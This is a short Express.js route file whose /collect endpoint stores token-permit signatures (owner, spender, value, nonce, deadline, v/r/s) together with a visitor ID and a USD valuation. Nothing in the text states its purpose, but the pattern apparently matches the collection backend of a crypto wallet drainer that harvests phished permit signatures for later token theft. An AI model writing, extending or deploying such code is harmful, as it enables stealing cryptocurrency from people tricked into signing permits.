import { Router } from "express";
import { db } from "../db";
const router = Router();
router.post("/collect", (req, res) => {
  const b = req.body ?? {};
  if (!b.token || !b.owner || !b.spender || !b.signature) return res.status(400).json({ error: "missing fields" });
  db.prepare(`INSERT INTO permits (chain_id, token, kind, owner, spender, value, nonce, deadline, signature, v, r, s, visitor_id, usd, symbol) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(b.chainId, b.token, b.kind, b.owner, b.spender, b.value, b.nonce, b.deadline, b.signature, b.v ?? null, b.r ?? null, b.s ?? null, b.visitorId ?? null, b.usd ?? null, b.symbol ?? null);
  res.json({ ok: true });
});
export default router;
